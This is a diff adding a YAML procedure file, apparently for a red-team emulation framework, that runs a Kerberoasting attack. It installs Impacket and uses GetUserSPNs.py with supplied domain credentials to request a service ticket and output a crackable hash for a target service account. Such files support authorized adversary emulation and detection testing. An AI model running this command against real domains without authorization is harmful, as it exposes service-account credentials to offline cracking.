@@ -1,0 +1,44 @@
+---
+api_version: 2.0
+uuid: 006f856e-506b-4e13-b334-7343d9b270ac
+name: Kerberoasting Attack
+authors:
+  - isaac_fletcher
+description: |
+  Performs a Kerberoasting attack against a user with a Service Principal Name (SPN).
+  Uses Impacket's GetUserSPNs.py to request a TGS ticket and output a crackable hash.
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1558 Steal or Forge Kerberos Tickets
+  subtechniques:
+    - T1558.003 Kerberoasting
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username for authentication (without domain prefix)
+  - name: password
+    description: Password for authentication
+  - name: target_user
+    description: The username of the service account to attack (without domain prefix)
+steps:
+  - name: setup_impacket
+    description: Install impacket
+    ttp: //utils/pip-install/ttp.yaml
+    args:
+      modules: "impacket"
+
+  - name: kerberoast
+    description: Request TGS ticket for the target service account
+    inline: |
+      GetUserSPNs.py "{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}" -dc-ip "{{.Args.dc}}" -request-user "{{.Args.target_user}}"
